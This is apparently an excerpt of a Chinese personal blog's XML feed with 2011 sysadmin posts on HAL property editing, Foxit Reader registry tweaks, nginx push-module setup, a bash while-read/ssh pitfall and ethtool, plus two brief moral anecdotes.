org.freedesktop.Hal.Device.Volume.method_argnames = { ‘mount_point fstype extr<br>a_options’, ‘extra_options’, ‘extra_options’ } (string list)<br>  info.interfaces = { ‘org.freedesktop.Hal.Device.Volume’ } (string list)<br>  storage.model = ‘’  (string)<br>  volume.size = 93340445184  (0x15bb862a00)  (uint64)<br>  info.udi = ‘/org/freedesktop/Hal/devices/volume_uuid_EE0454B90454868D’  (strin<br>g)<br>  volume.mount.valid_options = { ‘ro’, ‘sync’, ‘dirsync’, ‘noatime’, ‘nodiratime<br>‘, ‘noexec’, ‘quiet’, ‘remount’, ‘exec’, ‘uid=’, ‘gid=’, ‘umask=’, ‘dmask=’, ‘fm<br>ask=’, ‘locale=’, ‘utf8’ } (string list)<br>  org.freedesktop.Hal.Device.Volume.method_signatures = { ‘ssas’, ‘as’, ‘as’ } (string list)<br>  block.major = 8  (0x8)  (int)<br>  volume.fstype = ‘ntfs’  (string)<br>  org.freedesktop.Hal.Device.Volume.method_execpaths = { ‘hal-storage-mount’, ‘hal-storage-unmount’, ‘hal-storage-eject’ } (string list)<br>  volume.unmount.valid_options = { ‘lazy’ } (string list)<br>linux.hotplug_type = 3  (0x3)  (int)<br>  volume.partition.start = 62915198976  (0xea609c000)  (uint64)<br>  linux.sysfs_path = ‘/sys/block/sda/sda5’  (string)  </p><p>这里的全部都是关于hal自动挂载sda5的信息，上面的信息都是可以改动的。<br>现在我们要做的就是改动上面的信息，我们使用hal-set-property，来改变他们的值(这个命令需要root用户权限)。<br>通 常情况下使用这样的命令结构，hal-set-property –udi 设备的udi值（udi，相当于hal挂载设备的id是唯一的） –key 要改的键(如要改标卷volume.label) 然后接要改的值的类型 (–string 表示值为字符串, –int 值为整型，–bool 值为布尔) 后面为具体的值。<br>例如，我们要修改sda5的自动挂载的挂载点，让他固定而非disk-x，<br>hal-set-property –udi /org/freedesktop/Hal/devices/volume_uuid_EE0454B90454868D –key volume.mount_point –string /media/winE<br> hal-set-property –udi /org/freedesktop/Hal/devices/computer –key system.hardware.product –string “PowerEdge R610”<br>hal-set-property –udi /org/freedesktop/Hal/devices/computer –key system.hardware.serial –string “H5C3X3X”</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hal-set-property修改lshal信息 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>福昕PDF阅读器 V4去广告方法</title>
      <link href="/2011/03/07/fuxin-pdf-reader-v4-to-advertising-methods/"/>
      <url>/2011/03/07/fuxin-pdf-reader-v4-to-advertising-methods/</url>
      <content type="html"><![CDATA[<p><strong><em>清理历史痕迹的批处理</em></strong></p><p>将以下批处理内容（蓝色字体），复制到记事本，另存为，“清理Foxit PDF Reader历史痕迹.bat”即可。</p><p>（名字任意，不带双引号）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">----------------------------------华丽的分割线---------------------------------------------</span><br><span class="line"></span><br><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">title清理Foxit PDF Reader历史痕迹</span><br><span class="line"></span><br><span class="line">echo.</span><br><span class="line"></span><br><span class="line">echo清理Foxit PDF Reader历史痕迹</span><br><span class="line"></span><br><span class="line">pause</span><br><span class="line"></span><br><span class="line">reg delete &quot;HKCU\\Software\\Foxit Software\\福昕阅读器\\Recent File List&quot; /f &gt;nul 2&gt;nul</span><br><span class="line"></span><br><span class="line">echo.</span><br><span class="line"></span><br><span class="line">echo.</span><br><span class="line"></span><br><span class="line">echo.</span><br><span class="line"></span><br><span class="line">echo清理完成</span><br><span class="line"></span><br><span class="line">echo.</span><br><span class="line"></span><br><span class="line">echo按任意键关闭</span><br><span class="line"></span><br><span class="line">pause&gt;nul</span><br><span class="line"></span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line">--------------------------------华丽的分割线-----------------------------------------------</span><br></pre></td></tr></table></figure></p><p><strong><em>设置为不显示广告的批处理</em></strong></p><p>将以下批处理内容（绿色字体），复制到记事本，另存为，“不显示软件界面右上角的广告条.bat”即可。</p><p>（名字任意，不带双引号）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">--------------------------------华丽的分割线-----------------------------------------------</span><br><span class="line"></span><br><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">title不显示软件界面右上角的广告条</span><br><span class="line"></span><br><span class="line">echo.</span><br><span class="line"></span><br><span class="line">echo不显示软件界面右上角的广告条</span><br><span class="line"></span><br><span class="line">pause</span><br><span class="line"></span><br><span class="line">reg add &quot;HKCU\\Software\\Foxit Software\\福昕阅读器\\MainFrame&quot; /f /v ShowAd /t REG_SZ /d 0 &gt;nul 2&gt;nul</span><br><span class="line"></span><br><span class="line">echo.</span><br><span class="line"></span><br><span class="line">echo.</span><br><span class="line"></span><br><span class="line">echo.</span><br><span class="line"></span><br><span class="line">echo设置完成</span><br><span class="line"></span><br><span class="line">echo.</span><br><span class="line"></span><br><span class="line">echo按任意键关闭</span><br><span class="line"></span><br><span class="line">pause&gt;nul</span><br><span class="line"></span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line">--------------------------------华丽的分割线-----------------------------------------------</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 去广告方法 </tag>
            
            <tag> 福昕pdf阅读器 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Nginx的nginx_http_push_module模块测试</title>
      <link href="/2011/03/03/nginx-s-nginx-http-push-module-module-test-2/"/>
      <url>/2011/03/03/nginx-s-nginx-http-push-module-module-test-2/</url>
      <content type="html"><![CDATA[<p><a href="http://pushmodule.slact.net/" target="_blank" rel="noopener">Nginx的nginx_http_push_modul</a>e模块，可以使nginx服务器成为一个comet服务器</p><p>可以接受Client端的一个长连接请求，当server端有消息push时，则返回消息给Client</p><p>1. 编译很简单：</p><p>–add-module=../slact-nginx_http_push_module</p><p>2.配置如下：</p><p>折叠展开复制代码</p><ol><li>push_max_reserved_memory 20M;</li><li>push_authorized_channels_only on;</li><li></li><li><p>server{</p></li><li>listen 80;</li><li>server_name localhost test.ysz.com;</li><li>access_log /opt/work/log/nginx_access_ysz.log main;</li><li>error_log /opt/work/log/nginx_error_ysz.log error;</li><li></li><li><p>location /publish {</p></li><li>set $push_channel_id $arg_id;</li><li>push_publisher;</li><li>push_store_messages on;</li><li>push_message_timeout 2h;</li><li>push_max_message_buffer_length 10;</li><li>}</li><li>location /activity {</li><li>push_subscriber;</li><li>set \$push_channel_id \$arg_id;</li><li>push_subscriber_concurrency broadcast;</li><li>default_type text/plain;</li><li>}</li><li>}</li></ol><p>3.测试：</p><p>浏览器端访问<a href="http://localhost/activity?id=10000，则请求会被堵塞" target="_blank" rel="noopener">http://localhost/activity?id=10000，则请求会被堵塞</a></p><p>用python写一个简单的post程序，向<a href="http://localhost//publish?id=10000上post数据，则浏览器端会马上得到该消息" target="_blank" rel="noopener">http://localhost//publish?id=10000上post数据，则浏览器端会马上得到该消息</a></p><p>注意：请求publish时，如果要发布消息，则必须得是POST请求，而且对应的Content-Type会被转发给长连接的Client。Get请求会返回当前是否有存在的channel_id。具体的Http Push协议细节，可参考<a href="http://pushmodule.slact.net/protocol.html" target="_blank" rel="noopener">http://pushmodule.slact.net/protocol.html</a></p><p>4.一些问题：</p><ul><li>如果push模块放在后端的nginx上，而前段nginx反响代理到后端，当Client发送长连接请求时，<br>默认1分钟会直接断掉连接，返回504，不过可以设置proxy_read_timeout时间足够长来解决</li><li>设置push_subscriber_concurrency broadcast，可以将push消息同时发送给同一个用户开启的多个浏览器窗口，但我在一个浏览器里开多个tab也来请求，却只有一个能得到消息，另外一个请求仍旧没有返回。当设置成first时，对应同一个channel_id，如果有多个长连接请求，则只有第一个会等待返回，其它的都返回409。设置成last时，我的测试结果是所有请求都会断掉，似乎是一个Bug?</li><li>设置push_store_messages on，当没有对应的长连接请求时，可以暂时把msg缓存起来</li><li>设置push_authorized_channels_only on可以打开认证功能，只有当publisher给对应的<br>channel_id发送过消息后，Client端才可以发起一个长连接请求，否则会返回403 Forbidden错误</li><li>当client发起一个长连接请求时，accesslog和后端应用是无法知道其发送请求。不过，通过向publish发送一个Get请求来判断是否有对应channel_id的长连接请求.</li></ul><p>5.部分协议细节：</p><ul><li><p>订阅者：</p><p>The <a href="http://suchalin.blog.163.com/blog/#term-server" target="_blank" rel="noopener">server</a> MUST accept all valid HTTP <code>GET</code> requests to the <a href="http://suchalin.blog.163.com/blog/#term-subscriber" target="_blank" rel="noopener">subscriber</a> <a href="http://suchalin.blog.163.com/blog/#term-location" target="_blank" rel="noopener">location</a>. All other request methods SHOULD be responded to with a <code>405 Method Not Allowed</code>status code.  </p><p>Subscriber requests are considered notifications of intent to receive some message. Subscribers may request existing messages, messages that are not yet available, and messages that are no longer available. The requested message is identified using the <code>If-Modified-Since</code> and <code>If-None-Match</code> request headers. A request with no <code>If-Modified-Since</code> header MUST be assumed to be requesting the oldest available message in a channel. Each <code>200 OK</code> response containing a message MUST have its<code>Last-Modified</code> and <code>Etag</code> headers set so that a request using those headers will be interpreted as a request for the next available message. Additionally, said <code>200 OK</code>MUST contain the <code>Content-Type</code> header of the message publisher request, unless no <code>Content-Type</code> header had been provided or it is explicitly overridden by server configuration.</p><p>There are several common mechanisms for performing an HTTP server push. The rest of the behavior of the server in response to a subscriber request SHOULD be configurable and MUST be selected from the following list of mechanisms:</p><p>Long-Polling</p><p>Requests for existing messages will be responded to immediately; responses to requests for messages not yet available MUST be delayed until the message becomes available. Delayed responses MUST satisfy all of the following conditions:  </p><ul><li>A <code>200 OK</code> response containing the message (and its <code>Content-Type</code>) MUST be sent immediately after the message becomes available<br>. The entire response must be indistinguishable from a response to a request for an existing message.</li><li>If the channel the subscriber is waiting on is deleted or for some reason becomes unavailable, the server MUST immediately send a <code>410 Gone</code> response.</li><li>If another subscriber has conflicted with this request, the server MUST immediately send a <code>409 Conflict</code> response.</li></ul><p>Interval-Polling</p><p>All requests will be responded to immediately. Requests for messages not yet available MUST produce a <code>304 Not Modified</code> response code.</p><p>In addition, when the server receives more than one concurrent subscriber request on the same channel, it MUST do one of the following:</p><p>Broadcast</p><p>No additional actions are performed</p><p>Last-in, first-out</p><p>All but the most recent long-held <a href="http://suchalin.blog.163.com/blog/#term-subscriber" target="_blank" rel="noopener">subscriber</a> request on the channel are sent a <code>409 Conflict</code> response.</p><p>First-in, last-out</p><p>All but the oldest request will be sent a <code>409 Conflict</code></p></li></ul><pre><code>The [server](http://suchalin.blog.163.com/blog/#term-server) SHOULD make this selection configurable, and MUST default to `broadcast` behavior.</code></pre><ul><li>发送者：</li></ul><pre><code>The [server](http://suchalin.blog.163.com/blog/#term-server) MUST accept all valid HTTP requests to the publisher [location](http://suchalin.blog.163.com/blog/#term-location). The [server](http://suchalin.blog.163.com/blog/#term-server), when sent a publisher request, MUST satisfy all of the following conditions:  *   GET requests receive a `200 OK` response for existing [channels](http://suchalin.blog.163.com/blog/#term-channel) and a `404 Not Found` otherwise. &lt; /li&gt;*   PUT requests receive a `200 OK` response. The request creates a [channel](http://suchalin.blog.163.com/blog/#term-channel) if no [channel](http://suchalin.blog.163.com/blog/#term-channel) with the given [channel id](http://suchalin.blog.163.com/blog/#term-channel_id) exists.*   DELETE requests receive a `200 OK` if the [channel](http://suchalin.blog.163.com/blog/#term-channel) identified by the [channel id](http://suchalin.blog.163.com/blog/#term-channel_id) exists and has been completely deleted. All [subscribers](http://suchalin.blog.163.com/blog/#term-subscriber) MUST have been sent a`410 Gone` response. Requests for nonexistent [channels](http://suchalin.blog.163.com/blog/#term-channel) MUST be responded to with a `404 Not Found`.*   POST requests are used to send [messages](http://suchalin.blog.163.com/blog/#term-message). The request MAY contain a body in any encoding representing a [message](http://suchalin.blog.163.com/blog/#term-message) to be sent over the [channel](http://suchalin.blog.163.com/blog/#term-channel). The[message](http://suchalin.blog.163.com/blog/#term-message) MUST be immediately delivered to all currently long-held [subscriber](http://suchalin.blog.163.com/blog/#term-subscriber) requests. Additionally, the [message](http://suchalin.blog.163.com/blog/#term-message) MAY be stored for future retrieval and the oldest [message](http://suchalin.blog.163.com/blog/#term-message) stored for the [channel](http://suchalin.blog.163.com/blog/#term-channel) MAY be deleted.    A POST request MUST be replied to with a `201 Created` if there were any long-held [subscribers](http://suchalin.blog.163.com/blog/#term-subscriber) that have been sent this [message](http://suchalin.blog.163.com/blog/#term-message), and with a `202 Accepted`otherwise.    The Content-Type header of the request MUST be forwarded with the [message](http://suchalin.blog.163.com/blog/#term-message).</code></pre>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nginx </tag>
            
            <tag> http </tag>
            
            <tag> module </tag>
            
            <tag> push </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Nginx的nginx_http_push_module模块测试</title>
      <link href="/2011/03/01/nginx-s-nginx-http-push-module-module-test/"/>
      <url>/2011/03/01/nginx-s-nginx-http-push-module-module-test/</url>
      <content type="html"><![CDATA[<p><a href="http://pushmodule.slact.net/" target="_blank" rel="noopener">Nginx的nginx_http_push_modul</a>e模块，可以使nginx服务器成为一个comet服务器</p><p>可以接受Client端的一个长连接请求，当server端有消息push时，则返回消息给Client</p><p>1. 编译很简单：</p><p>–add-module=../slact-nginx_http_push_module</p><p>2.配置如下：</p><p>折叠展开复制代码</p><ol><li>push_max_reserved_memory 20M;</li><li>push_authorized_channels_only on;</li><li></li><li><p>server{</p></li><li>listen 80;</li><li>server_name localhost test.ysz.com;</li><li>access_log /opt/work/log/nginx_access_ysz.log main;</li><li>error_log /opt/work/log/nginx_error_ysz.log error;</li><li></li><li><p>location /publish {</p></li><li>set $push_channel_id $arg_id;</li><li>push_publisher;</li><li>push_store_messages on;</li><li>push_message_timeout 2h;</li><li>push_max_message_buffer_length 10;</li><li>}</li><li>location /activity {</li><li>push_subscriber;</li><li>set $push_channel_id $arg_id;</li><li>push_subscriber_concurrency broadcast;</li><li>default_type text/plain;</li><li>}</li><li>}</li></ol><p>3.测试：</p><p>浏览器端访问<a href="http://localhost/activity?id=10000，则请求会被堵塞" target="_blank" rel="noopener">http://localhost/activity?id=10000，则请求会被堵塞</a></p><p>用python写一个简单的post程序，向<a href="http://localhost//publish?id=10000上post数据，则浏览器端会马上得到该消息" target="_blank" rel="noopener">http://localhost//publish?id=10000上post数据，则浏览器端会马上得到该消息</a></p><p>注意：请求publish时，如果要发布消息，则必须得是POST请求，而且对应的Content-Type会被转发给长连接的Client。Get请求会返回当前是否有存在的channel_id。具体的Http Push协议细节，可参考<a href="http://pushmodule.slact.net/protocol.html" target="_blank" rel="noopener">http://pushmodule.slact.net/protocol.html</a></p><p>4.一些问题：</p><ul><li>如果push模块放在后端的nginx上，而前段nginx反响代理到后端，当Client发送长连接请求时，<br>默认1分钟会直接断掉连接，返回504，不过可以设置proxy_read_timeout时间足够长来解决</li><li>设置push_subscriber_concurrency broadcast，可以将push消息同时发送给同一个用户开启的多个浏览器窗口，但我在一个浏览器里开多个tab也来请求，却只有一个能得到消息，另外一个请求仍旧没有返回。当设置成first时，对应同一个channel_id，如果有多个长连接请求，则只有第一个会等待返回，其它的都返回409。设置成last时，我的测试结果是所有请求都会断掉，似乎是一个Bug?</li><li>设置push_store_messages on，当没有对应的长连接请求时，可以暂时把msg缓存起来</li><li>设置push_authorized_channels_only on可以打开认证功能，只有当publisher给对应的<br>channel_id发送过消息后，Client端才可以发起一个长连接请求，否则会返回403 Forbidden错误</li><li>当client发起一个长连接请求时，accesslog和后端应用是无法知道其发送请求。不过，通过向publish发送一个Get请求来判断是否有对应channel_id的长连接请求.</li></ul><p>5.部分协议细节：</p><ul><li><p>订阅者：</p><p>The <a href="http://suchalin.blog.163.com/blog/#term-server" target="_blank" rel="noopener">server</a> MUST accept all valid HTTP <code>GET</code> requests to the <a href="http://suchalin.blog.163.com/blog/#term-subscriber" target="_blank" rel="noopener">subscriber</a> <a href="http://suchalin.blog.163.com/blog/#term-location" target="_blank" rel="noopener">location</a>. All other request methods SHOULD be responded to with a <code>405 Method Not Allowed</code>status code.  </p><p>Subscriber requests are considered notifications of intent to receive some message. Subscribers may request existing messages, messages that are not yet available, and messages that are no longer available. The requested message is identified using the <code>If-Modified-Since</code> and <code>If-None-Match</code> request headers. A request with no <code>If-Modified-Since</code> header MUST be assumed to be requesting the oldest available message in a channel. Each <code>200 OK</code> response containing a message MUST have its<code>Last-Modified</code> and <code>Etag</code> headers set so that a request using those headers will be interpreted as a request for the next available message. Additionally, said <code>200 OK</code>MUST contain the <code>Content-Type</code> header of the message publisher request, unless no <code>Content-Type</code> header had been provided or it is explicitly overridden by server configuration.</p><p>There are several common mechanisms for performing an HTTP server push. The rest of the behavior of the server in response to a subscriber request SHOULD be configurable and MUST be selected from the following list of mechanisms:</p><p>Long-Polling</p><p>Requests for existing messages will be responded to immediately; responses to requests for messages not yet available MUST be delayed until the message becomes available. Delayed responses MUST satisfy all of the following conditions:  </p><ul><li>A <code>200 OK</code> response containing the message (and its <code>Content-Type</code>) MUST be sent immediately after the message becomes available<br>. The entire response must be indistinguishable from a response to a request for an existing message.</li><li>If the channel the subscriber is waiting on is deleted or for some reason becomes unavailable, the server MUST immediately send a <code>410 Gone</code> response.</li><li>If another subscriber has conflicted with this request, the server MUST immediately send a <code>409 Conflict</code> response.</li></ul><p>Interval-Polling</p><p>All requests will be responded to immediately. Requests for messages not yet available MUST produce a <code>304 Not Modified</code> response code.</p><p>In addition, when the server receives more than one concurrent subscriber request on the same channel, it MUST do one of the following:</p><p>Broadcast</p><p>No additional actions are performed</p><p>Last-in, first-out</p><p>All but the most recent long-held <a href="http://suchalin.blog.163.com/blog/#term-subscriber" target="_blank" rel="noopener">subscriber</a> request on the channel are sent a <code>409 Conflict</code> response.</p><p>First-in, last-out</p><p>All but the oldest request will be sent a <code>409 Conflict</code></p></li></ul><pre><code>The [server](http://suchalin.blog.163.com/blog/#term-server) SHOULD make this selection configurable, and MUST default to `broadcast` behavior.</code></pre><ul><li>发送者：</li></ul><pre><code>The [server](http://suchalin.blog.163.com/blog/#term-server) MUST accept all valid HTTP requests to the publisher [location](http://suchalin.blog.163.com/blog/#term-location). The [server](http://suchalin.blog.163.com/blog/#term-server), when sent a publisher request, MUST satisfy all of the following conditions:  *   GET requests receive a `200 OK` response for existing [channels](http://suchalin.blog.163.com/blog/#term-channel) and a `404 Not Found` otherwise. &lt; /li&gt;*   PUT requests receive a `200 OK` response. The request creates a [channel](http://suchalin.blog.163.com/blog/#term-channel) if no [channel](http://suchalin.blog.163.com/blog/#term-channel) with the given [channel id](http://suchalin.blog.163.com/blog/#term-channel_id) exists.*   DELETE requests receive a `200 OK` if the [channel](http://suchalin.blog.163.com/blog/#term-channel) identified by the [channel id](http://suchalin.blog.163.com/blog/#term-channel_id) exists and has been completely deleted. All [subscribers](http://suchalin.blog.163.com/blog/#term-subscriber) MUST have been sent a`410 Gone` response. Requests for nonexistent [channels](http://suchalin.blog.163.com/blog/#term-channel) MUST be responded to with a `404 Not Found`.*   POST requests are used to send [messages](http://suchalin.blog.163.com/blog/#term-message). The request MAY contain a body in any encoding representing a [message](http://suchalin.blog.163.com/blog/#term-message) to be sent over the [channel](http://suchalin.blog.163.com/blog/#term-channel). The[message](http://suchalin.blog.163.com/blog/#term-message) MUST be immediately delivered to all currently long-held [subscriber](http://suchalin.blog.163.com/blog/#term-subscriber) requests. Additionally, the [message](http://suchalin.blog.163.com/blog/#term-message) MAY be stored for future retrieval and the oldest [message](http://suchalin.blog.163.com/blog/#term-message) stored for the [channel](http://suchalin.blog.163.com/blog/#term-channel) MAY be deleted.    A POST request MUST be replied to with a `201 Created` if there were any long-held [subscribers](http://suchalin.blog.163.com/blog/#term-subscriber) that have been sent this [message](http://suchalin.blog.163.com/blog/#term-message), and with a `202 Accepted`otherwise.    The Content-Type header of the request MUST be forwarded with the [message](http://suchalin.blog.163.com/blog/#term-message).</code></pre>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nginx_http_push_module </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>[Bash Shell 程序设计]当while read 遇上ssh</title>
      <link href="/2011/03/01/bash-shell-program-design-while-read-encounters-ssh/"/>
      <url>/2011/03/01/bash-shell-program-design-while-read-encounters-ssh/</url>
      <content type="html"><![CDATA[<p>先看一段简化过的BASH SHELL代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">TODAY=\`date +%Y%m%d\`  </span><br><span class="line">SUFFIX=&quot;tar&quot;  </span><br><span class="line">CONF=the\_config\_file  </span><br><span class="line">i=0  </span><br><span class="line"></span><br><span class="line">while read HOST SRCPATH DSTPATH  </span><br><span class="line">do  </span><br><span class="line">        (( i++ ))  </span><br><span class="line">        if [ &quot;X$&#123;HOST:0:1&#125;&quot; = &quot;X#&quot; -o $&#123;#DSTPATH&#125; -eq 0 ]  </span><br><span class="line">        then  </span><br><span class="line">                #忽略注释行及少于3个项的记录  </span><br><span class="line">        else ssh $&#123;HOST&#125; &quot;tar c $&#123;SRCPATH&#125;&quot; &gt;$&#123;DSTPATH&#125;.$&#123;TODAY&#125;.$&#123;SUFFIX&#125; 2&gt;/dev/null  </span><br><span class="line">        fi  </span><br><span class="line">done &lt; $CONF</span><br></pre></td></tr></table></figure></p><p>作者的本意是通过脚本读取配置文件\$CONF，然后打包备份\$CONF中指定的文件，但执行后发现程序在成功备份\$CONF中指定的第一个文件后即退出……  </p><p>跟踪后发现read在备份完第一个文件后就再读不到任何数据，所以while循环结束－－也就是说，<br>通过重定向$CONF文件传给标准输入的数据被  </p><p>ssh \${HOST} “tar c \${SRCPATH}” &gt;\${DSTPATH}.\${TODAY}.${SUFFIX} 2&gt;/dev/null  </p><p>这个命令提前吃掉了。  </p><p>将其改为<br>ssh \${HOST} “tar c \${SRCPATH}” &gt;\${DSTPATH}.\${TODAY}.${SUFFIX} 2&gt;/dev/null &lt;/dev/null  </p><p>将ssh的标准输入重定向到/dev/null，程序正常备份所有$CONF中指定的文件。  </p><hr><p>结论:  </p><p>while read时，要注意那些处理标准输入的命令，例如  </p><p>cat,mail,ssh,grep,sed,tr,awk……（几乎所有支持流文本处理的命令都包含在内)</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> read </tag>
            
            <tag> ssh </tag>
            
            <tag> while </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>LINUX网卡(设置千兆网卡速度及模式)</title>
      <link href="/2011/02/25/linux-network-card-set-up-gigabit-network-speed-and-mode/"/>
      <url>/2011/02/25/linux-network-card-set-up-gigabit-network-speed-and-mode/</url>
      <content type="html"><![CDATA[<p>Ethtool是用于查询及设置网卡参数的命令。<br>概要：<br>ethtool ethX      //查询ethX网口基本设置<br>ethtool –h        //显示ethtool的命令帮助(help)<br>ethtool –i ethX    //查询ethX网口的相关信息<br>ethtool –d ethX    //查询ethX网口注册性信息<br>ethtool –r ethX    //重置ethX网口到自适应模式<br>ethtool –S ethX    //查询ethX网口收发包统计<br>ethtool –s ethX [speed 10|100|1000]\         //设置网口速率10/100/1000M<br>[duplex half|full]\           //设置网口半/全双工<br>[autoneg on|off]\            //设置网口是否自协商<br>[port tp|aui|bnc|mii]\         //设置网口类型<br>[phyad N]\<br>[xcvr internal|exteral]\<br>[wol p|u|m|b|a|g|s|d…]\<br>[sopass xx:yy:zz:aa:bb:cc]\<br>[msglvl N]</p><p>举例：<br>1）[root@linux /]# ethtool eth1<br>   Settings for eth1:<br>        Supported ports: [ TP ]<br>        Supported link modes:   10baseT/Half 10baseT/Full<br>                                100baseT/Half 100baseT/Full<br>                                1000baseT/Full<br>        Supports auto-negotiation: Yes<br>        Advertised link modes:  10baseT/Half 10baseT/Full<br>                                100baseT/Half 100baseT/Full<br>                                1000baseT/Full<br>        Advertised auto-negotiation: Yes<br>        Speed: 1000Mb/s<br>        Duplex: Full<br>        Port: Twisted Pair<br>        PHYAD: 0<br>        Transceiver: internal<br>        Auto-negotiation: on<br>        Supports Wake-on: umbg<br>        Wake-on: d<br>        Link detected: yes<br>2）[root@linux /]# ethtool -i eth1<br>   driver: e1000<br>   version: 5.0.43-k1<br>   firmware-version: N/A<br>   bus-info: 06:08.1<br>3）[root@linux /]# ethtool -S eth1<br>   NIC statistics:<br>     rx_packets: 58068300<br>     tx_packets: 87124083<br>     rx_bytes: 1589713008<br>     tx_bytes: 2165825901<br>     rx_errors: 0<br>     tx_errors: 0<br>     rx_dropped: 0<br>     tx_dropped: 0<br>     multicast: 0<br>     collisions: 0<br>     rx_length_errors: 0<br>     rx_over_errors: 0<br>     rx_crc_errors: 0<br>     rx_frame_errors: 0<br>     rx_fifo_errors: 0<br>     rx_missed_errors: 0<br>     tx_aborted_errors: 0<br>     tx_carrier_errors: 0<br>     tx_fifo_errors: 0<br>     tx_heartbeat_errors: 0<br>     tx_window_errors: 0<br>4）[root@linux /]# ethtool -s eth1 autoneg off speed 100 duplex full</p><p>相关：<br>1）[root@linux /]# which ethtool<br>    /sbin/ethtool<br>2）[root@linux /]# rpm -qf /sbin/ethtool<br>   ethtool-1.6-5<br>3）怎样使ethtool设置永久保存在网络设备中？<br>   解决方法一:<br>    ethtool设置可通过/etc/sysconfig/network-scripts/ifcfg-ethX文件保存,从而在设备下次启动时激活选项。<br>例如：ethtool -s eth0 speed 100 duplex full autoneg off<br>此指令将eth0设备设置为全双工自适应，速度为100Mbs。若要eth0启动时设置这些参数, 修改文件/etc/sysconfig/network-scripts/ifcfg-eth0 ，添加如下一行:<br> ETHTOOL_OPTS=”speed 100 duplex full autoneg off”<br>解决方法二:<br>将ethtool设置写入/etc/rc.d/rc.local之中。</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux网卡(设置千兆网卡速度及模式) </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>幸福</title>
      <link href="/2011/01/27/happiness/"/>
      <url>/2011/01/27/happiness/</url>
      <content type="html"><![CDATA[<p>小猪问妈妈幸福在哪里，妈妈说幸福就在自己的尾巴上。于是小猪开始用嘴咬它的小尾巴，却总也咬不到，它沮丧地告诉妈妈自己抓不住幸福，妈妈笑笑说：“孩子，只要你一直往前走，幸福就会一直跟着你……”</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 妈妈 </tag>
            
            <tag> 小猪 </tag>
            
            <tag> 尾巴 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>关于金钱</title>
      <link href="/2011/01/20/about-money/"/>
      <url>/2011/01/20/about-money/</url>
      <content type="html"><![CDATA[<p>有了钱  </p><p>你可以买楼  </p><p>但不可以买到一个家<br>有了钱  </p><p>你可以买钟表  </p><p>但不可以买到时间<br>有了钱  </p><p>你可以买一张床  </p><p>但不可以买到充足的睡眠<br>有了钱  </p><p>你可以买书  </p><p>但不可以买到知识<br>有了钱  </p><p>你可以买到医疗服务  </p><p>但不可以买到健康<br>有了钱  </p><p>你可以买到地位  </p><p>但不可以买到尊重<br>有了钱  </p><p>你可以买到血液  </p><p>但不可以买到生命<br>有了钱  </p><p>你可以买性  </p><p>但不可以买到爱</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 关于金钱 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>nginx-upstream-jvm-route插件 按sessionid转发</title>
      <link href="/2011/01/19/nginx-upon-jjs-route-plug-in-is-forwarded-by-sessionid/"/>
      <url>/2011/01/19/nginx-upon-jjs-route-plug-in-is-forwarded-by-sessionid/</url>
